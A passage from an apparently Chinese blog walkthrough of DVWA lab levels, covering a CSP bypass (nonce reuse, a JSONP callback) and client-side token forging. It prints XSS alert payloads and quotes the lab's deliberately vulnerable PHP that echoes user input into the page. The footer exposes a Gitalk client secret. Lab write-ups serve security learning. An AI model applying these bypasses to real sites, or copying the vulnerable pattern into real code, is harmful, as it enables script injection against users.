+&lt;form name=&quot;csp&quot; method=&quot;POST&quot;&gt;
+    &lt;p&gt;You can include scripts from external sources, examine the Content Security Policy and enter a URL to include here:&lt;/p&gt;
+    &lt;input size=&quot;50&quot; type=&quot;text&quot; name=&quot;include&quot; value=&quot;&quot; id=&quot;include&quot; /&gt;
+    &lt;input type=&quot;submit&quot; value=&quot;Include&quot; /&gt;
+&lt;/form&gt;
+&#39;;
+
+</code></pre><h3 id="难度：medium-11"><a href="#难度：medium-11" class="headerlink" title="难度：medium"></a>难度：medium</h3><p>直接通过内联 JavaScript 代码，注入时直接令 nonce 为设定好的值即可。构造payload：</p>
+<blockquote>
+<h1 id="alert-“xss”"><a href="#alert-“xss”" class="headerlink" title="alert(“xss”)"></a><script nonce="TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=">alert(“xss”)</script></h1></blockquote>
+<p><img src="http://alexjakin.github.io/medias/reward/dvwa_csp_md_1.png" alt="通过抓包分析CSP漏洞"></p>
+<p>代码审计得到以下信息：</p>
+<ol>
+<li>nonce-source，仅允许特定的内联脚本块。</li>
+<li>当csp有unsafe-inline时，受限于csp无法直接引入外部js</li>
+</ol>
+<pre><code>&lt;?php
+$headerCSP = &quot;Content-Security-Policy: script-src &#39;self&#39; &#39;unsafe-inline&#39; &#39;nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=&#39;;&quot;;
+header($headerCSP);
+// Disable XSS protections so that inline alert boxes will work
+header (&quot;X-XSS-Protection: 0&quot;);
+# &lt;script nonce=&quot;TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=&quot;&gt;alert(1)&lt;/script&gt;
+?&gt;
+&lt;?php
+if (isset ($_POST[&#39;include&#39;])) &#123;
+$page[ &#39;body&#39; ] .= &quot;
+    &quot; . $_POST[&#39;include&#39;] . &quot;
+&quot;;
+&#125;
+$page[ &#39;body&#39; ] .= &#39;
+&lt;form name=&quot;csp&quot; method=&quot;POST&quot;&gt;
+    &lt;p&gt;Whatever you enter here gets dropped directly into the page, see if you can get an alert box to pop up.&lt;/p&gt;
+    &lt;input size=&quot;50&quot; type=&quot;text&quot; name=&quot;include&quot; value=&quot;&quot; id=&quot;include&quot; /&gt;
+    &lt;input type=&quot;submit&quot; value=&quot;Include&quot; /&gt;
+&lt;/form&gt;
+&#39;;
+
+</code></pre><h3 id="难度：high-11"><a href="#难度：high-11" class="headerlink" title="难度：high"></a>难度：high</h3><p>构造payload：</p>
+<blockquote>
+<p>include=<script src="source/jsonp.php?callback=alert('xss');"></script></p>
+</blockquote>
+<p><img src="http://alexjakin.github.io/medias/reward/dvwa_csp_high_1.png" alt="抓包修改callback参数"></p>
+<p>代码审计可以得到以下信息：</p>
+<ol>
+<li>服务端不再设置白名单</li>
+<li>在点击网页的按钮使 js 生成一个 script 标签，src 指向 <strong>source/jsonp.php?callback=solveNum</strong>。</li>
+<li><strong>source/jsonp.php?callback=solveNum</strong>里面设置了一个solveNum函数，这里的script标签会把远程加载的solveSum({“answer”:”15”}) 当作 js 代码执行</li>
+</ol>
+<pre><code>服务端源码：
+
+&lt;?php
+$headerCSP = &quot;Content-Security-Policy: script-src &#39;self&#39;;&quot;;
+header($headerCSP);
+?&gt;
+&lt;?php
+if (isset ($_POST[&#39;include&#39;])) &#123;
+$page[&#39;body&#39;] .= &quot;
+    &quot; . $_POST[&#39;include&#39;] . &quot;
+&quot;;
+&#125;
+$page[ &#39;body&#39; ] .= &#39;
+&lt;form name=&quot;csp&quot; method=&quot;POST&quot;&gt;
+    &lt;p&gt;The page makes a call to &#39; . DVWA_WEB_PAGE_TO_ROOT . &#39;/vulnerabilities/csp/source/jsonp.php to load some code. Modify that page to run your own code.&lt;/p&gt;
+    &lt;p&gt;1+2+3+4+5=&lt;span id=&quot;answer&quot;&gt;&lt;/span&gt;&lt;/p&gt;
+    &lt;input type=&quot;button&quot; id=&quot;solve&quot; value=&quot;Solve the sum&quot; /&gt;
+&lt;/form&gt;
+&lt;script src=&quot;source/high.js&quot;&gt;&lt;/script&gt;
+&#39;;
+
+
+
+客户端源码：
+function clickButton() &#123;
+    var s = document.createElement(&quot;script&quot;);
+    s.src = &quot;source/jsonp.php?callback=solveSum&quot;;
+    document.body.appendChild(s);
+&#125;
+
+function solveSum(obj) &#123;
+    if (&quot;answer&quot; in obj) &#123;
+        document.getElementById(&quot;answer&quot;).innerHTML = obj[&#39;answer&#39;];
+    &#125;
+&#125;
+
+var solve_button = document.getElementById (&quot;solve&quot;);
+
+if (solve_button) &#123;
+    solve_button.addEventListener(&quot;click&quot;, function() &#123;
+        clickButton();
+    &#125;);
+&#125;
+</code></pre><h2 id="JavaScript-Attacks"><a href="#JavaScript-Attacks" class="headerlink" title="JavaScript Attacks"></a>JavaScript Attacks</h2><h3 id="难度：low-13"><a href="#难度：low-13" class="headerlink" title="难度：low"></a>难度：low</h3><p>没有思路，所以先进行代码审计，发现无法输入什么，token都是<strong>8b479aefbd90795395b3e7089ae0dc09</strong></p>
+<p>所以只能抓数据包修改”success”对应的md5值：<strong>38581812b435834ebf84ebcc2c6424d6</strong></p>
+<pre><code>&lt;?php
+$page[ &#39;body&#39; ] .= &lt;&lt;&lt;EOF
+&lt;script&gt;
+
+/*
+MD5 code from here
+https://github.com/blueimp/JavaScript-MD5
+*/
+
+!function(n)&#123;&quot;use strict&quot;;function t(n,t)&#123;var r=(65535&amp;n)+(65535&amp;t);return(n&gt;&gt;16)+(t&gt;&gt;16)+(r&gt;&gt;16)&lt;&lt;16|65535&amp;r&#125;function r(n,t)&#123;return n&lt;&lt;t|n&gt;&gt;&gt;32-t&#125;function e(n,e,o,u,c,f)&#123;return t(r(t(t(e,n),t(u,f)),c),o)&#125;function o(n,t,r,o,u,c,f)&#123;return e(t&amp;r|~t&amp;o,n,t,u,c,f)&#125;function u(n,t,r,o,u,c,f)&#123;return e(t&amp;o|r&amp;~o,n,t,u,c,f)&#125;function c(n,t,r,o,u,c,f)&#123;return e(t^r^o,n,t,u,c,f)&#125;function f(n,t,r,o,u,c,f)&#123;return e(r^(t|~o),n,t,u,c,f)&#125;function i(n,r)&#123;n[r&gt;&gt;5]|=128&lt;&lt;r%32,n[14+(r+64&gt;&gt;&gt;9&lt;&lt;4)]=r;var e,i,a,d,h,l=1732584193,g=-271733879,v=-1732584194,m=271733878;for(e=0;e&lt;n.length;e+=16)i=l,a=g,d=v,h=m,g=f(g=f(g=f(g=f(g=c(g=c(g=c(g=c(g=u(g=u(g=u(g=u(g=o(g=o(g=o(g=o(g,v=o(v,m=o(m,l=o(l,g,v,m,n[e],7,-680876936),g,v,n[e+1],12,-389564586),l,g,n[e+2],17,606105819),m,l,n[e+3],22,-1044525330),v=o(v,m=o(m,l=o(l,g,v,m,n[e+4],7,-176418897),g,v,n[e+5],12,1200080426),l,g,n[e+6],17,-1473231341),m,l,n[e+7],22,-45705983),v=o(v,m=o(m,l=o(l,g,v,m,n[e+8],7,1770035416),g,v,n[e+9],12,-1958414417),l,g,n[e+10],17,-42063),m,l,n[e+11],22,-1990404162),v=o(v,m=o(m,l=o(l,g,v,m,n[e+12],7,1804603682),g,v,n[e+13],12,-40341101),l,g,n[e+14],17,-1502002290),m,l,n[e+15],22,1236535329),v=u(v,m=u(m,l=u(l,g,v,m,n[e+1],5,-165796510),g,v,n[e+6],9,-1069501632),l,g,n[e+11],14,643717713),m,l,n[e],20,-373897302),v=u(v,m=u(m,l=u(l,g,v,m,n[e+5],5,-701558691),g,v,n[e+10],9,38016083),l,g,n[e+15],14,-660478335),m,l,n[e+4],20,-405537848),v=u(v,m=u(m,l=u(l,g,v,m,n[e+9],5,568446438),g,v,n[e+14],9,-1019803690),l,g,n[e+3],14,-187363961),m,l,n[e+8],20,1163531501),v=u(v,m=u(m,l=u(l,g,v,m,n[e+13],5,-1444681467),g,v,n[e+2],9,-51403784),l,g,n[e+7],14,1735328473),m,l,n[e+12],20,-1926607734),v=c(v,m=c(m,l=c(l,g,v,m,n[e+5],4,-378558),g,v,n[e+8],11,-2022574463),l,g,n[e+11],16,1839030562),m,l,n[e+14],23,-35309556),v=c(v,m=c(m,l=c(l,g,v,m,n[e+1],4,-1530992060),g,v,n[e+4],11,1272893353),l,g,n[e+7],16,-155497632),m,l,n[e+10],23,-1094730640),v=c(v,m=c(m,l=c(l,g,v,m,n[e+13],4,681279174),g,v,n[e],11,-358537222),l,g,n[e+3],16,-722521979),m,l,n[e+6],23,76029189),v=c(v,m=c(m,l=c(l,g,v,m,n[e+9],4,-640364487),g,v,n[e+12],11,-421815835),l,g,n[e+15],16,530742520),m,l,n[e+2],23,-995338651),v=f(v,m=f(m,l=f(l,g,v,m,n[e],6,-198630844),g,v,n[e+7],10,1126891415),l,g,n[e+14],15,-1416354905),m,l,n[e+5],21,-57434055),v=f(v,m=f(m,l=f(l,g,v,m,n[e+12],6,1700485571),g,v,n[e+3],10,-1894986606),l,g,n[e+10],15,-1051523),m,l,n[e+1],21,-2054922799),v=f(v,m=f(m,l=f(l,g,v,m,n[e+8],6,1873313359),g,v,n[e+15],10,-30611744),l,g,n[e+6],15,-1560198380),m,l,n[e+13],21,1309151649),v=f(v,m=f(m,l=f(l,g,v,m,n[e+4],6,-145523070),g,v,n[e+11],10,-1120210379),l,g,n[e+2],15,718787259),m,l,n[e+9],21,-343485551),l=t(l,i),g=t(g,a),v=t(v,d),m=t(m,h);return[l,g,v,m]&#125;function a(n)&#123;var t,r=&quot;&quot;,e=32*n.length;for(t=0;t&lt;e;t+=8)r+=String.fromCharCode(n[t&gt;&gt;5]&gt;&gt;&gt;t%32&amp;255);return r&#125;function d(n)&#123;var t,r=[];for(r[(n.length&gt;&gt;2)-1]=void 0,t=0;t&lt;r.length;t+=1)r[t]=0;var e=8*n.length;for(t=0;t&lt;e;t+=8)r[t&gt;&gt;5]|=(255&amp;n.charCodeAt(t/8))&lt;&lt;t%32;return r&#125;function h(n)&#123;return a(i(d(n),8*n.length))&#125;function l(n,t)&#123;var r,e,o=d(n),u=[],c=[];for(u[15]=c[15]=void 0,o.length&gt;16&amp;&amp;(o=i(o,8*n.length)),r=0;r&lt;16;r+=1)u[r]=909522486^o[r],c[r]=1549556828^o[r];return e=i(u.concat(d(t)),512+8*t.length),a(i(c.concat(e),640))&#125;function g(n)&#123;var t,r,e=&quot;&quot;;for(r=0;r&lt;n.length;r+=1)t=n.charCodeAt(r),e+=&quot;0123456789abcdef&quot;.charAt(t&gt;&gt;&gt;4&amp;15)+&quot;0123456789abcdef&quot;.charAt(15&amp;t);return e&#125;function v(n)&#123;return unescape(encodeURIComponent(n))&#125;function m(n)&#123;return h(v(n))&#125;function p(n)&#123;return g(m(n))&#125;function s(n,t)&#123;return l(v(n),v(t))&#125;function C(n,t)&#123;return g(s(n,t))&#125;function A(n,t,r)&#123;return t?r?s(t,n):C(t,n):r?m(n):p(n)&#125;&quot;function&quot;==typeof define&amp;&amp;define.amd?define(function()&#123;return A&#125;):&quot;object&quot;==typeof module&amp;&amp;module.exports?module.exports=A:n.md5=A&#125;(this);
+
+    function rot13(inp) &#123;
+        return inp.replace(/[a-zA-Z]/g,function(c)&#123;return String.fromCharCode((c&lt;=&quot;Z&quot;?90:122)&gt;=(c=c.charCodeAt(0)+13)?c:c-26);&#125;);
+    &#125;
+
+    function generate_token() &#123;
+        var phrase = document.getElementById(&quot;phrase&quot;).value;
+        document.getElementById(&quot;token&quot;).value = md5(rot13(phrase));
+    &#125;
+
+    generate_token();
+&lt;/script&gt;
+EOF;
+?&gt;
+
+</code></pre><p><img src="http://alexjakin.github.io/medias/reward/dvwa_js_low_1.png" alt="抓包修改token和phrase参数"></p>
+<h3 id="难度：medium-12"><a href="#难度：medium-12" class="headerlink" title="难度：medium"></a>难度：medium</h3><p>代码审计可以得到以下信息：</p>
+<ol>
+<li>生成token代码存放在客户端而不是服务器</li>
+<li>跟low难度一样，先生成token抓包修改即可</li>
+</ol>
+<pre><code>服务端：
+&lt;?php
+$page[ &#39;body&#39; ] .= &#39;&lt;script src=&quot;&#39; . DVWA_WEB_PAGE_TO_ROOT . &#39;vulnerabilities/javascript/source/medium.js&quot;&gt;&lt;/script&gt;&#39;;
+?&gt;
+
+
+客户端：
+function do_something(e) &#123;
+    for (var t = &quot;&quot;, n = e.length - 1; n &gt;= 0; n--) t += e[n];
+    return t
+&#125;
+setTimeout(function() &#123;
+    do_elsesomething(&quot;XX&quot;)
+&#125;, 300);
+
+function do_elsesomething(e) &#123;
+    document.getElementById(&quot;token&quot;).value = do_something(e + document
+        .getElementById(&quot;phrase&quot;).value + &quot;XX&quot;)
+&#125;
+</code></pre><p>先在控制台执行<strong>do_everything(“success”)</strong>，然后抓包修改即可</p>
+<p><img src="http://alexjakin.github.io/medias/reward/dvwa_js_md.png" alt="抓包修改token和phrase参数"></p>
+<h3 id="难度：high-12"><a href="#难度：high-12" class="headerlink" title="难度：high"></a>难度：high</h3><p>和前 2 个等级差不多，依次执行 token_part_1(“ABCD”, 44) 和 token_part_2(“XX”)，最后点击提交执行 token_part_3()。</p>
+<p>所以攻击步骤如下：</p>
+<ol>
+<li>修改输入框内容为success</li>
+<li>执行token_part_1，再执行token_part_2</li>
+<li>最后点submit提交，其实也就是执行token_part_3</li>
+</ol>
+<p><img src="http://alexjakin.github.io/medias/reward/dvwa_js_high.png" alt="high难度的攻击方式"></p>
+<p>代码审计可以得到以下信息：</p>
+<ol>
+<li>这个地方设了坑，让人以为执行顺序是：token_part_2 =》token_part_3=》token_part_1，其实是 token_part_1 =》token_part_2=》token_part_3</li>
+</ol>
+<pre><code>服务端：
+&lt;?php
+$page[ &#39;body&#39; ] .= &#39;&lt;script src=&quot;&#39; . DVWA_WEB_PAGE_TO_ROOT . &#39;vulnerabilities/javascript/source/high.js&quot;&gt;&lt;/script&gt;&#39;;
+?&gt;
+
+
+
+客户端代码：
+function do_something(e) &#123;
+    for (var t = &quot;&quot;, n = e.length - 1; n &gt;= 0; n--) t += e[n];
+    return t
+&#125;
+
+function token_part_3(t, y = &quot;ZZ&quot;) &#123;
+    document.getElementById(&quot;token&quot;).value = sha256(document.getElementById(&quot;token&quot;).value + y)
+&#125;
+
+function token_part_2(e = &quot;YY&quot;) &#123;
+    document.getElementById(&quot;token&quot;).value = sha256(e + document.getElementById(&quot;token&quot;).value)
+&#125;
+
+function token_part_1(a, b) &#123;
+    document.getElementById(&quot;token&quot;).value = do_something(document.getElementById(&quot;phrase&quot;).value)
+&#125;
+
+document.getElementById(&quot;phrase&quot;).value = &quot;&quot;;
+setTimeout(function() &#123;
+    token_part_2(&quot;XX&quot;)
+&#125;, 300);
+document.getElementById(&quot;send&quot;).addEventListener(&quot;click&quot;, token_part_3);
+token_part_1(&quot;ABCD&quot;, 44);
+</code></pre><h3 id="impossible-1"><a href="#impossible-1" class="headerlink" title="impossible"></a>impossible</h3><p><img src="http://alexjakin.github.io/medias/reward/dvwa_js_impossible.png" alt="high难度的攻击方式"></p>
+<p>这里感觉作者给我们开了个玩笑，也是一个警告，叫我们不要相信任何来自用户的东西或者阻止用户搞破坏</p>
+<p>到这里就收尾了，断断续续这个平台我做了有一周时间了，基本上每天都投入不少时间在里边，希望自己能越来越强！</p>
+
+            </div>
+            <hr/>
+
+            
+            <style>
+    #reward {
+        margin: 40px 0;
+        text-align: center;
+    }
+
+    #reward .reward-link {
+        font-size: 1.88rem;
+    }
+
+    #reward .btn-floating:hover {
+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    #rewardModal {
+        width: 320px;
+        height: 350px;
+    }
+
+    #rewardModal .reward-title {
+        margin: 15px auto;
+        padding-bottom: 5px;
+    }
+
+    #rewardModal .modal-content {
+        padding: 10px;
+    }
+
+    #rewardModal .close {
+        position: absolute;
+        right: 15px;
+        top: 15px;
+        color: rgba(0, 0, 0, 0.5);
+        font-size: 1.3rem;
+        line-height: 20px;
+        cursor: pointer;
+    }
+
+    #rewardModal .close:hover {
+        color: #ef5350;
+        transform: scale(1.3);
+        -moz-transform:scale(1.3);
+        -webkit-transform:scale(1.3);
+        -o-transform:scale(1.3);
+    }
+
+    #rewardModal .reward-tabs {
+        margin: 0 auto;
+        width: 210px;
+    }
+
+    .reward-tabs .tabs {
+        height: 38px;
+        margin: 10px auto;
+        padding-left: 0;
+    }
+
+    .reward-content ul {
+        padding-left: 0 !important;
+    }
+
+    .reward-tabs .tabs .tab {
+        height: 38px;
+        line-height: 38px;
+    }
+
+    .reward-tabs .tab a {
+        color: #fff;
+        background-color: #ccc;
+    }
+
+    .reward-tabs .tab a:hover {
+        background-color: #ccc;
+        color: #fff;
+    }
+
+    .reward-tabs .wechat-tab .active {
+        color: #fff !important;
+        background-color: #22AB38 !important;
+    }
+
+    .reward-tabs .alipay-tab .active {
+        color: #fff !important;
+        background-color: #019FE8 !important;
+    }
+
+    .reward-tabs .reward-img {
+        width: 210px;
+        height: 210px;
+    }
+</style>
+
+<div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-large waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fa fa-close"></i></a>
+            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+            
+
+            <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+
+<div id="article-share">
+    
+    <div class="social-share" data-disabled="qzone" data-wechat-qrcode-helper="<p>微信里点“发现”->“扫一扫”二维码便可查看分享。</p>"></div>
+    
+</div>
+
+<script src="/libs/share/js/social-share.min.js"></script>
+
+            <div class="reprint">
+                <p>
+                    <span class="reprint-tip">
+                        <i class="fa fa-exclamation-circle"></i>&nbsp;&nbsp;转载请注明:
+                    </span>
+                    <a href="http://www.alexjakin.github.io" class="b-link-green">Justin博客</a>
+                    <i class="fa fa-angle-right fa-lg fa-fw text-color"></i>
+                    <a href="/2023/04/26/dvwadeanzhuangjishuatishizhan/" class="b-link-green">DVWA的安装及刷题实战</a>
+                </p>
+            </div>
+        </div>
+    </div>
+
+    
+        <link rel="stylesheet" href="/libs/gitalk/gitalk.css">
+<link rel="stylesheet" href="/css/my-gitalk.css">
+
+<div class="card gitalk-card" data-aos="fade-up">
+    <div id="gitalk-container" class="card-content"></div>
+</div>
+
+<script src="/libs/gitalk/gitalk.min.js"></script>
+<script>
+    let gitalk = new Gitalk({
+        clientID: 'ecd7dd32eb0d3e971e56',
+        clientSecret: 'e1561d514b42ff5f7b3e9e00f514425bdf75b229',
+        repo: 'MyBlog',
+        owner: 'AlexJakin',
+        admin: "AlexJakin",
+        id: '2023-04-26T19-30-35',
+        distractionFreeMode: false  // Facebook-like distraction free mode
+    });
+
+    gitalk.render('gitalk-container');
+</script>
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fa fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/2023/05/01/hongrivulnstackanquanshizhanbachang/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/4.jpg" class="responsive-img" alt="红日(vulnstack)安全实战靶场">
+                        
+                        <span class="card-title">红日(vulnstack)安全实战靶场</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary">背景这次靶场环境是红日安全团队提供：
+http://vulnstack.qiyuanxuetang.net/vuln/detail/2/
+靶场环境这里介绍一下靶场的实验环境，记得开启windows7的PHPstudy
+
+
+
+主机
+地址
+
+
+</div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="fa fa-clock-o fa-fw icon-date"></i>2023-05-01
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fa fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" class="post-category" target="_blank">
+                                    网络安全
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" target="_blank">
+                        <span class="chip bg-color">网络安全</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fa fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2023/03/27/dfssousuosuanfazhongfangxiangshuzudehanyijiliti/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/1.jpg" class="responsive-img" alt="DFS搜索算法中方向数组的含义及例题">
+                        
+                        <span class="card-title">DFS搜索算法中方向数组的含义及例题</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary">方向数组含义方向数组，常应用于搜索算法中，有四方向（上，右，下，左），也有八方向（顺时针或逆时针）。广泛应用于迷宫，棋盘等寻路问题中
+方向数组解析四方向c代表示码：
+dx[4] = &#123;-1, 0, 1, 0&#125;
+dy[4]</div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2023-03-27
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fa fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E7%AE%97%E6%B3%95%E6%8F%90%E9%AB%98/" class="post-category" target="_blank">
+                                    算法提高
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/DFS/" target="_blank">
+                        <span class="chip bg-color">DFS</span>
+                    </a>
+                    
+                    <a href="/tags/%E6%96%B9%E5%90%91%E6%95%B0%E7%BB%84/" target="_blank">
+                        <span class="chip bg-color">方向数组</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+</div>
+
+
+<script>
+    $('#articleContent').on('copy', function (e) {
+        // IE8 or earlier browser is 'undefined'
+        if (typeof window.getSelection === 'undefined') return;
+
+        var selection = window.getSelection();
+        // if the selection is short let's not annoy our users.
+        if (('' + selection).length < Number.parseInt('40')) {
+            return;
+        }
+
+        // create a div outside of the visible area and fill it with the selected text.
+        var bodyElement = document.getElementsByTagName('body')[0];
+        var newdiv = document.createElement('div');
+        newdiv.style.position = 'absolute';
+        newdiv.style.left = '-99999px';
+        bodyElement.appendChild(newdiv);
+        newdiv.appendChild(selection.getRangeAt(0).cloneContents());
+
+        // we need a <pre> tag workaround.
+        // otherwise the text inside "pre" loses all the line breaks!
+        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE') {
+            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
+        }
+
+        var url = document.location.href;
+        newdiv.innerHTML += '<br />'
+            + '来源: Justin博客<br />'
+            + '作者: Alex Jakin<br />'
+            + '链接: <a href="' + url + '">' + url + '</a><br />'
+            + '本文章著作权归作者所有，任何形式的转载都请注明出处。';
+
+        selection.selectAllChildren(newdiv);
+        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
+    });
+</script>
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget">
+            <div class="toc-title"><i class="fa fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fa fa-list"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            // headingsOffset: -205,
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).slideUp(500);
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).slideDown(500);
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+    
+
+</main>
+
+
+<script src="https://cdn.bootcss.com/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script>
+    MathJax.Hub.Config({
+        tex2jax: {inlineMath: [['$', '$'], ['\(', '\)']]}
+    });
+</script>
+
+<footer class="page-footer bg-color">
+    <div class="container row center-align">
+        <div class="col s12 m8 l8 copy-right">
+            本站由&copy;<a href="https://github.com/AlexJakin" target="_blank">Alex</a>基于
+            <a href="https://hexo.io/" target="_blank">Hexo</a>搭建.
+
+            
+                &nbsp;<i class="fa fa-area-chart"></i>&nbsp;站点总字数:&nbsp;
+                <span class="white-color">66.4k</span>
+            
+
+            
+			
+                <br>
+                
+                <span id="busuanzi_container_site_pv">
+                    <i class="fa fa-heart-o"></i>
+                    本站总访问量 <span id="busuanzi_value_site_pv" class="white-color"></span>
+                </span>
+                
+                
+                <span id="busuanzi_container_site_uv">
+                    <i class="fa fa-users"></i>
+                    次,&nbsp;访客数 <span id="busuanzi_value_site_uv" class="white-color"></span> 人.
+                </span>
+                
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/AlexJakin" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fa fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:1272296763@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fa fa-envelope-open"></i>
+    </a>
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1272296763" class="tooltipped" data-tooltip="QQ联系我: 1272296763" data-position="top" data-delay="50">
+        <i class="fa fa-qq"></i>
+    </a>
+
+
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+<!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fa fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script src="/js/search.js"></script>
+<script type="text/javascript">
+$(function () {
+    searchFunc("/" + "search.xml", 'searchInput', 'searchResult');
+});
+</script>
+<!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fa fa-angle-up"></i>
+    </a>
+</div>
+
+
+<script src="/libs/materialize/materialize.min.js"></script>
+<script src="/libs/masonry/masonry.pkgd.min.js"></script>
+<script src="/libs/aos/aos.js"></script>
+<script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+<script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+<script src="/js/matery.js"></script>
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+
+    <script src="/libs/others/clicklove.js"></script>
+
+
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
